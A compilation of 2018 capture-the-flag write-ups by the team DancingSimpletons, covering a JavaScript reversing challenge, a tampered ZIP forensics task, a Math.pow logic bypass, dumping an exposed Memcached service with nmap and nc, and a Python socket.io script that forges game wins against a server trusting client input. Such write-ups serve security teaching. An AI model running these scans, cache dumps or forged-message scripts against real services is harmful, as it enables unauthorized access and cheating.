<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-dancingsimpletons
description: CTF writeups and security challenges by DancingSimpletons.
---

# Writeups by DancingSimpletons

Source repository: `/repos/DancingSimpletons`

## Repository Index

- writeups/googlectf-2018/js-safe-2_0.md
- writeups/securinets-2018/LoneAuthor.md
- writeups/securinets-2018/MagicTest.md
- writeups/securinets-2018/Service Hidden in the Bush.md
- writeups/securinets-2018/Tic Tac Toe.md
- writeups/securinets-2018/easy.md
- writeups/sunshinectf-2018/Old-Favorites.md
- writeups/sunshinectf-2018/my-secret-stash.md
- writeups/sunshinectf-2018/search-box.md
- writeups/swampctf-2018/Etherealboy.md
- writeups/swampctf-2018/locked-dungeon-2.md
- writeups/swampctf-2018/the-vault.md
- writeups/swampctf-2018/words-of-power.md
- writeups/tumctf-2016/haggis.md

## Writeup Content


### File: writeups/googlectf-2018/js-safe-2_0.md

# JS Safe 2.0 writeup

`You stumbled upon someone's "JS Safe" on the web. It's a simple HTML file that can store secrets in the browser's localStorage. This means that you won't be able to extract any secret from it (the secrets are on the computer of the owner), but it looks like it was hand-crafted to work only with the password of the owner..`

Along with this description we get a zip containing the html/js with the safe.

Let's first take a look at the code, we've got:

1. A script block with a function x(x).
2. An open_safe() function, calling the x(x) function.

## Looking at open_safe()

The open_safe function is the starting point, so why not start there.

```javascript
function open_safe() {
  keyhole.disabled = true;
  password = /^CTF{([0-9a-zA-Z_@!?-]+)}$/.exec(keyhole.value);
  if (!password || !x(password[1])) return document.body.className = 'denied';
  document.body.className = 'granted';
  password = Array.from(password[1]).map(c => c.charCodeAt());
  encrypted = JSON.parse(localStorage.content || '');
  content.value = encrypted.map((c,i) => c ^ password[i % password.length]).map(String.fromCharCode).join('')
}
```

So, the password needs to match the regular expression, and the part between the curly brackets needs to make the x(x) function return true. Next, let's take a look at the x(x) function.

## The x(x) function

```javascript
function x(х){ord=Function.prototype.call.bind(''.charCodeAt);chr=String.fromCharCode;str=String;function h(s){for(i=0;i!=s.length;i++){a=((typeof a=='undefined'?1:a)+ord(str(s[i])))%65521;b=((typeof b=='undefined'?0:b)+a)%65521}return chr(b>>8)+chr(b&0xFF)+chr(a>>8)+chr(a&0xFF)}function c(a,b,c){for(i=0;i!=a.length;i++)c=(c||'')+chr(ord(str(a[i]))^ord(str(b[i%b.length])));return c}for(a=0;a!=1000;a++)debugger;x=h(str(x));source=/Ӈ#7ùª9¨M¤À.áÔ¥6¦¨¹.ÿÓÂ.Ö£JºÓ¹WþÊmãÖÚG¤¢dÈ9&òªћ#³­1᧨/;source.toString=function(){return c(source,x)};try{console.log('debug',source);with(source)return eval('eval(c(source,x))')}catch(e){}}
```

Well... that's not very easy to read. Let's 'prettify' it:

```javascript
function x(х) {
    ord = Function.prototype.call.bind(''.charCodeAt);
    chr = String.fromCharCode;
    str = String;

    function h(s) {
        for (i = 0; i != s.length; i++) {
            a = ((typeof a == 'undefined' ? 1 : a) + ord(str(s[i]))) % 65521;
            b = ((typeof b == 'undefined' ? 0 : b) + a) % 65521
        }
        return chr(b >> 8) + chr(b & 0xFF) + chr(a >> 8) + chr(a & 0xFF)
    }

    function c(a, b, c) {
        for (i = 0; i != a.length; i++) c = (c || '') + chr(ord(str(a[i])) ^ ord(str(b[i % b.length])));
        return c
    }
    for (a = 0; a != 1000; a++) debugger;
    x = h(str(x));
    source = /Ӈ#7ùª9¨M¤À.áÔ¥6¦¨¹.ÿÓÂ.Ö£JºÓ¹WþÊmãÖÚG¤¢dÈ9&òªћ#³­1᧨/;
    source.toString = function() {
        return c(source, x)
    };
    try {
        console.log('debug', source);
        with(source) return eval('eval(c(source,x))')
    } catch (e) {}
}
``` 
It seems like there is some hashing function h(s), a 'crypto' function c(a, b, c) and some other logic. The hashing function basically takes the input and produces 4 bytes of output. The crypto function takes input `a` and XORs it with with `b` byte by byte and puts the result in `c`. 

The flag seems to be encrypted in `source`, but let's look at that later. First we'll see what else we've got.

Now trying to do anything with the debugger open will just give you some nice crashing tab in the browser, due to some anti-debugging measures that are present, like:

```javascript 
for (a = 0; a != 1000; a++) debugger;
```
This is pretty straightforward, it just triggers the debugger to break at that point every loop. Luckily it is fairly easy to get around it, in the console you can assign 999 to `a` and step further without wasting our time.

and:

```javascript
source.toString = function() {
    return c(source, x)
};
```
This is a nicer one, the toString will be called a little further on, when `console.log('debug', source)` is called. It will try to XOR `source` with `x`. However, source is a regular expression and therfore the `for (i = 0; i != a.length; i++)` will just loop forever. 

## Getting around the anti-debugging

Now the first idea might be to just remove all this annoying stuff from the source and just continue unimpeded. That's what we did, however we found out the resulting hash assigned to `x` would not decrypt the value of `source`. We looked at the part where `x` was supposed to me hashed and noticed the result was the same no matter the input. Upon closer inspection we saw the `x` passed in `x = h(str(x));` is actually he reference to the function `x(x)`. So modifying anything would mess up the hash you need to decrypt the value of `source`.

We then took an unmodified file and had to do some tricks to get around the anti-debugging via other ways. The looping call to `debugger;` wasn't really in the way, so we could just work around that. The way we got around the overridden source.toString() method was by adding this:
```javascript
var console = {};
console.log = function(){};
window.console = console;
```
This will just override the `console.log()` method, so it won't call the toString method on `source` and we'll be able to step through.

While debugging, we noted the output of `x = h(str(x));` and saved it (`[130, 30, 10, 154]`) we also noted down the states of `a` and `b` in the hash function, because variables `a` and `b` keep their values. The values are:  `a` = `2714`, `b` = `33310`.

Only one mystery remains: why doesn't the `eval('eval(c(source,x))')` also end up in an infinite loop? Reading MDN on [with](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Statements/with) gives us a clue: anything in the with block that can be resolved in the `source` object _will_ be resolved there... and a JS [RegExp object](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp) actually has a `source` [property](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/source), which contains... the source of the regex! So `with(source) eval('eval(c(source,x))` will actually call `c` with a _string_ containing the ciphertext.

## Decrypting
We can use now output of the hashing function to decrypt the value of source as follows:

```python
key = [130, 30, 10, 154] * 100
encrypted = [ord(c) for c in u"""Ӈ#7ùª9¨M¤À.áÔ¥6¦¨¹.ÿÓÂ.Ö£JºÓ¹WþÊmãÖÚG¤
¢dÈ9&òªћ#³­1᧨"""]

''.join([chr(ab ^ kb) for (ab, kb) in zip(encrypted, key)])
```
which gives us:

``` javascript
"х==c('¢×&Ê´cÊ¯¬$¶³´}ÍÈ´T©Ð8Í³Í|Ô÷aÈÐÝ&¨þJ',h(х))//᧢"
```

This output will be evaled again to decrypt `'¢×&Ê´cÊ¯¬$¶³´}ÍÈ´T©Ð8Í³Í|Ô÷aÈÐÝ&¨þJ'`, and the plaintext result needs to equal the part between the curly braces of our input. The ciphertext is to be decrypted with the hash of our input (i.e., the part of the flag between the curly braces). 

Here we know the key is 4 bytes long and will repeat. We know the plain text is limited to match the regex: `([0-9a-zA-Z_@!?-]+)`. We could just try all possibilities and see which one outputs some valid string. But because we'd rather be lazy, so we try some other way.

Instead of attacking all four bytes at the same time, we tackle them independently. For example, we know the first key byte will be XORed with each fourth ciphertext byte, i.e., `['¢', 'Ê', '¯', ...]`. Each of those XORs needs to result in a value in `[0-9a-zA-Z_@!?-]`. So we simply check all 255 possible values, and verify each XOR results in a valid plaintext:

```python
ciphertext = u'¢×&Ê´cÊ¯¬$¶³´}ÍÈ´T©Ð8Í³Í|Ô÷aÈÐÝ&¨þJ'

for i in range(4):
    options = set(range(256))

    for encrypted_char in ciphertext[i::4]:
        for option in list(options):
            plaint_text_char = chr(ord(encrypted_char) ^ option)
            if plaint_text_char not in legal_chars:
                options.remove(option)
                
    print("Possible values for key byte {}: {}".format(i, options))
```

Which gives us:
```
Possible values for key byte 0: {253}
Possible values for key byte 1: {149, 153}
Possible values for key byte 2: {21}
Possible values for key byte 3: {249}
```

Now it is just a matter of trying both options of the second byte, and we get the flag: 
```
'CTF{_N3x7-v3R51ON-h45-AnTI-4NTi-ant1-D3bUg_}'
```


### File: writeups/securinets-2018/LoneAuthor.md

# Lone Author

**Unfortunately we were only able to solve this challenge after the CTF ended. 
No tasks were available anymore, so I couldn't get the challenge text :(**

The gist of the challenge (as far as I remember): 
*Something happened and the lone_author.zip file was found/recovered or whatever.*

We'll have to find the flag in this zip file.

## The lone_author Zip file

So we have a Zip file... Let's see what happens if we look try to unzip

``` console
$ unzip lone_author.zip
Archive:  lone_author.zip
  End-of-central-directory signature not found.  Either this file is not
  a zipfile, or it constitutes one disk of a multi-part archive.  In the
  latter case the central directory and zipfile comment will be found on
  the last disk(s) of this archive.
note:  lone_author.zip may be a plain executable, not an archive
unzip:  cannot find zipfile directory in one of lone_author.zip or
        lone_author.zip.zip, and cannot find lone_author.zip.ZIP, period.
```
Ok... I don't know what I expected...

So what's up with this 'zip', let's look at the raw data.
```console
$ xxd -l 256 lone_author.zip
00000000: 504b 4603 0414 0000 0008 0059 8a75 4cef  PKF........Y.uL.
00000010: 0bc5 ad41 1f00 00d2 6202 0009 001c 0071  ...A....b......q
00000020: 725f 7073 2e74 6966 5554 0900 03e9 85b2  r_ps.tifUT......
00000030: 5aec 85b2 5a75 780b 0001 04e8 0300 0004  Z...Zux.........
00000040: e803 0000 ec3a 095c 1357 9f2f 9c8a 80a2  .....:.\.W./....
00000050: 58ad 7e6a 5494 7a84 9084 2410 3914 44c5  X.~jT.z...$.9.D.
00000060: ca21 2078 21df 6432 0929 4926 2613 4014  .! x!.d2.)I&&.@.
00000070: e2d5 5a6d d5ad a2d6 abb4 56a5 722e d60b  ..Zm......V.r...
```
Ok, so [this is what wikipedia says](https://en.wikipedia.org/wiki/Zip_(file_format)) about the ZIP format:
<table>
  <tbody>
    <tr>
      <th>Offset</th>
      <th>Bytes</th>
      <th>Description</th>
    </tr>
    <tr>
      <td>0</td>
      <td>4</td>
      <td>Local file header signature = 0x04034b50 (read as a little-endian number)</td>
    </tr>
  </tbody>
</table>

What we have `50 4b 46 03 04` vs what we expect `50 4b 03 04`. 
So we have a byte extra, that's weird. Do the other headers have an extra byte as well?
```
50 4B 46 03 04
50 4B 61 03 04
50 4B 67 03 04
50 4B 7B 03 04
50 4B 4D 07 08
50 4B 33 01 02
50 4B 33 05 06
50 4B 74 01 02
50 4B 5F 4D 01 02
50 4B 33 01 02
50 4B 5F 31 05 06
```
So apparently some had 2 extra bytes (between the 0x504B and the second half of the ID), but they are all printable ASCII characters.
All extra bytes combine to `46 61 67 7B 4D 33 33 74 5F 33 5F`, which can be represented as `Flag{M33t_M3_1` too.

Alright! However, that only seems to be half of a flag. Let's continue :)

## Lone Author zip, continued

So we know that the headers are not correct, so will the ZIP be valid if we just remove all these extra bytes from the headers?

**_Spoiler alert_**: it is :D

Unzipping gives us three files:
- some file named `0e68542470`
- a TIFF file named `qr_ps.tif`
- another ZIP file named `secret.zip`

### secret.zip
Ok, secret.zip contains an image. But it also is password protected =( I guess the other files will get us the password.

### the 0e68542470 file
Okay, let's just hexdump this puppy
```console
$ xxd 0e68542470
00000000: 4d61 6e2c 2079 6f75 2068 6176 6520 746f  Man, you have to
00000010: 2074 6869 7320 7468 6973 2054 4946 4621   this this TIFF!
```
Okay... i have to do what to the TIFF? Let's just open the TIFF and see.

### the qr_ps.tif
Opening the TIFF file shows us this partial qr code:
![Partial qr code](https://raw.githubusercontent.com/DancingSimpletons/writeups/master/securinets-2018/qr_ps-tif.png)

Hmm, I think this qr code is beyond saving. So let's just look at the file, maybe there is something besides the image itself.

Things like binwalk or file don't really show things that catch my eye. So maybe just look at the raw data, maybe there is something there. A quick scan through the whole file doesn't show much of interest. So let's just go through the metadata a bit more carefully.
```console
00000000: 4949 2a00 0800 0000 1600 fe00 0400 0100  II*.............
00000010: 0000 0000 0000 0001 0300 0100 0000 af00  ................
00000020: 0000 0101 0300 0100 0000 af00 0000 0201  ................
00000030: 0300 0400 0000 1601 0000 0301 0300 0100  ................
00000040: 0000 0100 0000 0601 0300 0100 0000 0200  ................
00000050: 0000 1101 0400 0100 0000 4e84 0000 1201  ..........N.....
00000060: 0300 0100 0000 0100 0000 1501 0300 0100  ................
00000070: 0000 0400 0000 1601 0300 0100 0000 af00  ................
00000080: 0000 1701 0400 0100 0000 84de 0100 1a01  ................
00000090: 0500 0100 0000 1e01 0000 1b01 0500 0100  ................
000000a0: 0000 2601 0000 1c01 0300 0100 0000 0100  ..&.............
000000b0: 0000 2801 0300 0100 0000 0200 0000 3101  ..(...........1.
000000c0: 0200 2200 0000 2e01 0000 3201 0200 1400  ..".......2.....
000000d0: 0000 5001 0000 5201 0300 0100 0000 0100  ..P...R.........
000000e0: 0000 bc02 0100 4a1c 0000 6401 0000 4986  ......J...d...I.
000000f0: 0100 c218 0000 ae1d 0000 6987 0400 0100  ..........i.....
00000100: 0000 2484 0000 5c93 0700 b44d 0000 7036  ..$...\....M..p6
00000110: 0000 0000 0000 0800 0800 0800 0800 80fc  ................
00000120: 0a00 1027 0000 80fc 0a00 1027 0000 4164  ...'.......'..Ad
00000130: 6f62 6520 5068 6f74 6f73 686f 7020 4343  obe Photoshop CC
00000140: 2032 3031 3520 2857 696e 646f 7773 2900   2015 (Windows).
00000150: 3230 3138 3a30 333a 3231 2031 373a 3034  2018:03:21 17:04
00000160: 3a30 3400 3c3f 7870 6163 6b65 7420 6265  :04.<?xpacket be
00000170: 6769 6e3d 27ef bbbf 2720 6964 3d27 5735  gin='...' id='W5
00000180: 4d30 4d70 4365 6869 487a 7265 537a 4e54  M0MpCehiHzreSzNT
00000190: 637a 6b63 3964 273f 3e0a 3c78 3a78 6d70  czkc9d'?>.<x:xmp
000001a0: 6d65 7461 2078 6d6c 6e73 3a78 3d27 6164  meta xmlns:x='ad
000001b0: 6f62 653a 6e73 3a6d 6574 612f 2720 783a  obe:ns:meta/' x:
000001c0: 786d 7074 6b3d 2749 6d61 6765 3a3a 4578  xmptk='Image::Ex
000001d0: 6966 546f 6f6c 2031 302e 3735 273e 0a3c  ifTool 10.75'>.<
000001e0: 7264 663a 5244 4620 786d 6c6e 733a 7264  rdf:RDF xmlns:rd
000001f0: 663d 2768 7474 703a 2f2f 7777 772e 7733  f='http://www.w3
00000200: 2e6f 7267 2f31 3939 392f 3032 2f32 322d  .org/1999/02/22-
00000210: 7264 662d 7379 6e74 6178 2d6e 7323 273e  rdf-syntax-ns#'>
00000220: 0a0a 203c 7264 663a 4465 7363 7269 7074  .. <rdf:Descript
00000230: 696f 6e20 7264 663a 6162 6f75 743d 2727  ion rdf:about=''
00000240: 0a20 2078 6d6c 6e73 3a64 633d 2768 7474  .  xmlns:dc='htt
00000250: 703a 2f2f 7075 726c 2e6f 7267 2f64 632f  p://purl.org/dc/
00000260: 656c 656d 656e 7473 2f31 2e31 2f27 3e0a  elements/1.1/'>.
00000270: 2020 3c64 633a 666f 726d 6174 3e69 6d61    <dc:format>ima
00000280: 6765 2f74 6966 663c 2f64 633a 666f 726d  ge/tiff</dc:form
00000290: 6174 3e0a 203c 2f72 6466 3a44 6573 6372  at>. </rdf:Descr
000002a0: 6970 7469 6f6e 3e0a 0a20 3c72 6466 3a44  iption>.. <rdf:D
000002b0: 6573 6372 6970 7469 6f6e 2072 6466 3a61  escription rdf:a
000002c0: 626f 7574 3d27 270a 2020 786d 6c6e 733a  bout=''.  xmlns:
000002d0: 7064 663d 2768 7474 703a 2f2f 6e73 2e61  pdf='http://ns.a
000002e0: 646f 6265 2e63 6f6d 2f70 6466 2f31 2e33  dobe.com/pdf/1.3
000002f0: 2f27 3e0a 2020 3c70 6466 3a41 7574 686f  /'>.  <pdf:Autho
00000300: 723e 5061 7373 776f 7264 2074 6f20 7468  r>Password to th
00000310: 6520 7365 636f 6e64 2070 6172 7420 6973  e second part is
00000320: 2030 784e 4f58 2a2a 3c2f 7064 663a 4175   0xNOX**</pdf:Au
00000330: 7468 6f72 3e0a 203c 2f72 6466 3a44 6573  thor>. </rdf:Des
00000340: 6372 6970 7469 6f6e 3e0a 0a20 3c72 6466  cription>.. <rdf
00000350: 3a44 6573 6372 6970 7469 6f6e 2072 6466  :Description rdf
00000360: 3a61 626f 7574 3d27 270a 2020 786d 6c6e  :about=''.  xmln
00000370: 733a 7068 6f74 6f73 686f 703d 2768 7474  s:photoshop='htt
00000380: 703a 2f2f 6e73 2e61 646f 6265 2e63 6f6d  p://ns.adobe.com
00000390: 2f70 686f 746f 7368 6f70 2f31 2e30 2f27  /photoshop/1.0/'
000003a0: 3e0a 2020 3c70 686f 746f 7368 6f70 3a43  >.  <photoshop:C
000003b0: 6f6c 6f72 4d6f 6465 3e33 3c2f 7068 6f74  olorMode>3</phot
000003c0: 6f73 686f 703a 436f 6c6f 724d 6f64 653e  oshop:ColorMode>
000003d0: 0a20 3c2f 7264 663a 4465 7363 7269 7074  . </rdf:Descript
000003e0: 696f 6e3e 0a0a 203c 7264 663a 4465 7363  ion>.. <rdf:Desc
000003f0: 7269 7074 696f 6e20 7264 663a 6162 6f75  ription rdf:abou
00000400: 743d 2727 0a20 2078 6d6c 6e73 3a78 6d70  t=''.  xmlns:xmp
00000410: 3d27 6874 7470 3a2f 2f6e 732e 6164 6f62  ='http://ns.adob
00000420: 652e 636f 6d2f 7861 702f 312e 302f 273e  e.com/xap/1.0/'>
00000430: 0a20 203c 786d 703a 4372 6561 7465 4461  .  <xmp:CreateDa
00000440: 7465 3e32 3031 382d 3033 2d32 3154 3136  te>2018-03-21T16
00000450: 3a35 333a 3031 2b30 313a 3030 3c2f 786d  :53:01+01:00</xm
00000460: 703a 4372 6561 7465 4461 7465 3e0a 2020  p:CreateDate>.
```
I spy with my little eye...

```console
000002f0: 2f27 3e0a 2020 3c70 6466 3a41 7574 686f  /'>.  <pdf:Autho
00000300: 723e 5061 7373 776f 7264 2074 6f20 7468  r>Password to th
00000310: 6520 7365 636f 6e64 2070 6172 7420 6973  e second part is
00000320: 2030 784e 4f58 2a2a 3c2f 7064 663a 4175   0xNOX**</pdf:Au
00000330: 7468 6f72 3e0a 203c 2f72 6466 3a44 6573  thor>. </rdf:Des
00000340: 6372 6970 7469 6f6e 3e0a 0a20 3c72 6466  cription>.. <rdf
```

Alright, a password. Let's try it on the secret.zip we have :)

### secret.zip, revisited
Using the string `0xNOX**` as the password for secret.zip, we get another image. This displays the second half of the flag in plain text:

![second half of flag](https://raw.githubusercontent.com/DancingSimpletons/writeups/master/securinets-2018/export.png)

Making the total flag `Flag{M33t_M3_1n_tHe_p4RK_T0mOrrOW}`.

**Now, we weren't able to submit the solution because the CTF closed by the time we found it**



### File: writeups/securinets-2018/MagicTest.md

Magic_Test
----------
> Even Magic is all about scientific proof these days, prove your magic powers and defy laws of math ! you can read the source code (http://web2.quals18.ctfsecurinets.com/server.js) to have a better understanding of what i mean.
>
> Link : http://web1.quals18.ctfsecurinets.com

Let's take a look at the web page first.

![MagicTest Page](https://github.com/DancingSimpletons/writeups/blob/master/securinets-2018/MagicTest.PNG)

The server js has this check to get the flag:
``` javascript
var priority = Math.pow(2, getAsciiCode(username) + getTimestamp(birthDay));
    
if(priority >= 0) {
    res.send('Hey peasent, no flag for you !!');
}
else {
    res.send('Your magical powers have been proven, here is your flag: ' + flag );
}
```
Ok, so what does javascripts `Math.pow()` return? [MDN says:](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/pow)
``` javascript
// simple
Math.pow(7, 2);    // 49
Math.pow(7, 3);    // 343
Math.pow(2, 10);   // 1024
// fractional exponents
Math.pow(4, 0.5);  // 2 (square root of 4)
Math.pow(8, 1/3);  // 2 (cube root of 8)
Math.pow(2, 0.5);  // 1.4142135623730951 (square root of 2)
Math.pow(2, 1/3);  // 1.2599210498948732 (cube root of 2)
// signed exponents
Math.pow(7, -2);   // 0.02040816326530612 (1/49)
Math.pow(8, -1/3); // 0.5
// signed bases
Math.pow(-7, 2);   // 49 (squares are positive)
Math.pow(-7, 3);   // -343 (cubes can be negative)
Math.pow(-7, 0.5); // NaN (negative numbers don't have a real square root)
// due to "even" and "odd" roots laying close to each other, 
// and limits in the floating number precision, 
// negative bases with fractional exponents always return NaN
Math.pow(-7, 1/3); // NaN
```
Since we can basically fill in any date, let's give it some data to make `Math.pow()` return NaN.
We can easily check it in the console of our browser by copying the main parts from the server.js

``` javascript
function getTimestamp(date) {
    try{
        var x = Math.floor((new Date(date)) / 1000);
        return x;
    } catch( e ){
        return  Math.floor((new Date()) / 1000);
    }
}

function getAsciiCode(str)
{
    var arr1 = [];
    for (var n = 0; n < str.length; n ++) 
     {
        var ascii = Number(str.charCodeAt(n));
        arr1.push(ascii);
     }
    return arr1.join('');
}
var priority = Math.pow(2, getAsciiCode("HorseEgg") + getTimestamp("1001-01-01"));
console.log(priority);
//Output: NaN
```
Using a date before 1970-01-01 will result in a negative value for the Timestamp, which will be concatenated to the result of the getAsciiCode function. This this _beautifully_ ends up as:
``` javascript
getAsciiCode("HorseEgg") + getTimestamp("1001-01-01")
//output: "7211111411510169103103-30578688000"
```
Since `Math.pow(2, "7211111411510169103103-30578688000")` results in `NaN`, we get the flag:  `Flag{PhP_H4s_seCuriTY_issues_THEY-Said!!!}`



### File: writeups/securinets-2018/Service Hidden in the Bush.md

Service Hidden in the bush
--------------------------
> The Emperors wanted to hide their secret in a location where they can read it quickly,
> But they don't know anything about Security. Try to expose it: net1.quals18.ctfsecurinets.com

First, `nmap` the host to see what services are running
```console
$ nmap -vvvv -Pn net1.quals18.ctfsecurinets.com -p1-65535 -sT                                                                                                                                               master 130

Starting Nmap 6.40 ( http://nmap.org ) at 2018-03-25 18:52 CEST
Initiating Parallel DNS resolution of 1 host. at 18:52
Completed Parallel DNS resolution of 1 host. at 18:52, 6.53s elapsed
DNS resolution of 1 IPs took 6.53s. Mode: Async [#: 2, OK: 1, NX: 0, DR: 0, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 18:52
Scanning net1.quals18.ctfsecurinets.com (34.245.183.111) [65535 ports]
Discovered open port 22/tcp on 34.245.183.111
Connect Scan Timing: About 17.68% done; ETC: 18:55 (0:02:24 remaining)
Connect Scan Timing: About 38.88% done; ETC: 18:55 (0:01:36 remaining)
Discovered open port 11211/tcp on 34.245.183.111
Connect Scan Timing: About 62.37% done; ETC: 18:55 (0:00:55 remaining)
Completed Connect Scan at 18:55, 159.85s elapsed (65535 total ports)
Nmap scan report for net1.quals18.ctfsecurinets.com (34.245.183.111)
Host is up (0.050s latency).
rDNS record for 34.245.183.111: ec2-34-245-183-111.eu-west-1.compute.amazonaws.com
Scanned at 2018-03-25 18:52:39 CEST for 159s
Not shown: 65533 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
11211/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 166.45 seconds
```

What's on port 11211? [Memcached](https://www.speedguide.net/port.php?port=11211)!

Using some [help from StackOverflow](https://stackoverflow.com/questions/19560150/get-all-keys-set-in-memcached) and a [Memcached telnet command list](https://blog.elijaa.org/2010/05/21/memcached-telnet-command-summary/#get), we can then:

```console
$ nc net1.quals18.ctfsecurinets.com  11211
stats items
STAT items:1:number 1
STAT items:1:age 0
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 83171
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 0
STAT items:1:lrutail_reflocked 0
END
stats cachedump 1 100
ITEM flag [23 b; 1521998034 s]
END
get flag
VALUE flag 0 23
Flag{M3mc4cH3d_3xp0s3d}
END
```

```

```



### File: writeups/securinets-2018/Tic Tac Toe.md

Tic Tac Toe
-----------
> TheEmperors learned how to play the Tic Tac Toe game and since that time,
> for million of years, no one have defeated them in this game. You have to defeat
> TheEmperors player 100 times to become the newest serial winner of this game. Then you will get the flag
> 
> Link : http://web2.quals18.ctfsecurinets.com:5000

Open the link, open the developer console, and play a few games. Notice that the communication to the server happens
over a Websockets connection -- specifically using the Socket.io protocol. For example, we can see the following interaction

```
> ["createGame", {name: "test"}]
< ["newGame",{"name":"test","room":"bd74794bd98a1904c791fa7620bc1d5b6ce176e4561dccabd121df6b58bbdfdb8d6ba6d1e99fa063a23b438e3e898cc2","player1":{"name":"test","wins":0,"loose":0,"serial_winner":0},"player2":{"name":"TheEmperors","wins":1928,"loose":10320}}]

> ["joinGame",{"ennemy_name":"TheEmperors","room":"bd74794bd98a1904c791fa7620bc1d5b6ce176e4561dccabd121df6b58bbdfdb8d6ba6d1e99fa063a23b438e3e898cc2"}]
< ["player2",{"room":"bd74794bd98a1904c791fa7620bc1d5b6ce176e4561dccabd121df6b58bbdfdb8d6ba6d1e99fa063a23b438e3e898cc2"}]

> ["playTurn",{"row":"0","col":"0","player":"O","room":"bd74794bd98a1904c791fa7620bc1d5b6ce176e4561dccabd121df6b58bbdfdb8d6ba6d1e99fa063a23b438e3e898cc2"}]
< ["turnPlayed",{"row":"0","col":"0","room":"bd74794bd98a1904c791fa7620bc1d5b6ce176e4561dccabd121df6b58bbdfdb8d6ba6d1e99fa063a23b438e3e898cc2","matrix":[["O","-","-"],["-","-","-"],["-","-","-"]]}]

> ["playTurn",{"row":"1","col":"1","player":"X","room":"bd74794bd98a1904c791fa7620bc1d5b6ce176e4561dccabd121df6b58bbdfdb8d6ba6d1e99fa063a23b438e3e898cc2"}]
< ["turnPlayed",{"row":"1","col":"1","room":"bd74794bd98a1904c791fa7620bc1d5b6ce176e4561dccabd121df6b58bbdfdb8d6ba6d1e99fa063a23b438e3e898cc2","matrix":[["O","-","-"],["-","X","-"],["-","-","-"]]}]

...

> ["gameEnded",{"room":"bd74794bd98a1904c791fa7620bc1d5b6ce176e4561dccabd121df6b58bbdfdb8d6ba6d1e99fa063a23b438e3e898cc2","message":"Checkmate like a charm ;) TheEmperors player wins!"}]
< ["gameEnd",{"room":"bd74794bd98a1904c791fa7620bc1d5b6ce176e4561dccabd121df6b58bbdfdb8d6ba6d1e99fa063a23b438e3e898cc2","message":"Checkmate like a charm ;) TheEmperors player wins!"}]
```

Note that The Emperor's moves are calculated on the _client side_! This opens possibilities.

Using [socketIO-client](https://pypi.python.org/pypi/socketIO-client), we can easily write a client in Python to send exactly what we
want to the server. We simply position three 'X'-es on the diagonal, and tell the server the game is finished. The server happily accepts
this, and starts a new game. We repeat this until the server sends us the flag.

The message/callback order is as follows:
1. Client sends `createGame` message
2. Server sends `newGame`, client sends `joinGame`
3. Server sends `player2`, client sends `playTurn`
4. Server sends `turnPlayed`. Client sends `playTurn` if moves remaining (goto 4) or `gameEnded` otherwise (goto 2)

```python
import logging
logging.getLogger('socketIO-client').setLevel(logging.DEBUG)
logging.basicConfig()

from socketIO_client import SocketIO, LoggingNamespace
import time

class TicTacToe:
    max_iters = 150  # make sure we don't keep repeating until infinity
    turns = [("X", 0, 0), ("X", 1, 1), ("X", 2, 2)]  # three X-es on the diagonal

    def __init__(self):
        self.iters = 0
        
        self.client = SocketIO('ec2-54-194-213-165.eu-west-1.compute.amazonaws.com', 5000, LoggingNamespace)
        self.client.on('newGame', self.newGame)
        self.client.on('player2', self.nextTurn)
        self.client.on('turnPlayed', self.nextTurn)

    def create_game(self):
        self.client.emit("createGame", {"name": "DancingSimpletons"})

    def newGame(self, args):
        time.sleep(0.1)
        
        self.iters += 1
        print("iteration ", self.iters)
        if (self.iters > self.max_iters):
            return

        self.turnindex = 0
        self.room = args['room']
        self.enemy = args['player2']['name']
        
        self.client.emit("joinGame", {"ennemy_name": self.enemy, "room": self.room})

    def nextTurn(self, args):
        if (self.turnindex == len(self.turns)):
            return self.lastTurn(args)

        (player, row, col) = self.turns[self.turnindex]
        self.turnindex += 1

        self.client.emit("playTurn", {
                'row': row,
                'col': col,
                'player': player,
                'room': self.room
        })

    def lastTurn(self, args):
        self.client.emit("gameEnded", {
                'message': 'whatever',
                'room': self.room
        })

t = TicTacToe()
t.create_game()
t.client.wait(seconds=100)
```

When we run this, we get (NB. 'packet sent' are sent messages, while 'message' indicates a received message)
```
[engine.io transport selected] websocket
[engine.io heartbeat reset]
[socket.io packet sent] 2["createGame", {"name": "DancingSimpletons"}]
[engine.io message] b'0'
[socket.io packet received] b'0'
[socket.io connect]
[socket.io connected]
[engine.io pong] b''
[engine.io message] b'2["newGame",{"name":"DancingSimpletons","room":"1bb964113bde07dbc4c5d0f7eba56508421b52bfe7d84ea2d506edbc413e20d6ade3f0e202db9e34040a43d66352ec5b","player1":{"name":"DancingSimpletons","wins":0,"loose":0,"serial_winner":0},"player2":{"name":"TheEmperors","wins":1956,"loose":10445}}]'
[...]
[socket.io packet sent] 2["gameEnded", {"message": "whatever", "room": "1bb964113bde07dbc4c5d0f7eba56508421b52bfe7d84ea2d506edbc413e20d6ade3f0e202db9e34040a43d66352ec5b"}]
[engine.io message] b'2["newGame",{"room":"1bb964113bde07dbc4c5d0f7eba56508421b52bfe7d84ea2d506edbc413e20d6ade3f0e202db9e34040a43d66352ec5b","player1":{"name":1,"wins":1,"loose":0,"serial_winner":1},"player2":{"name":"TheEmperors","wins":1956,"loose":10446}}]'
[...]
[socket.io packet received] b'2["newGame",{"room":"1a35dc1c9fef1f3e68be621a11582bf25db8cffe611ec33afe3465fbfd54b5ae570bf55a068dc56a89fab1be91f37890","player1":{"name":100,"wins":100,"loose":0,"serial_winner":100},"player2":{"name":"TheEmperors","wins":1961,"loose":10651}}]'
[...]
[socket.io packet sent] 2["gameEnded", {"message": "whatever", "room": "1a35dc1c9fef1f3e68be621a11582bf25db8cffe611ec33afe3465fbfd54b5ae570bf55a068dc56a89fab1be91f37890"}]
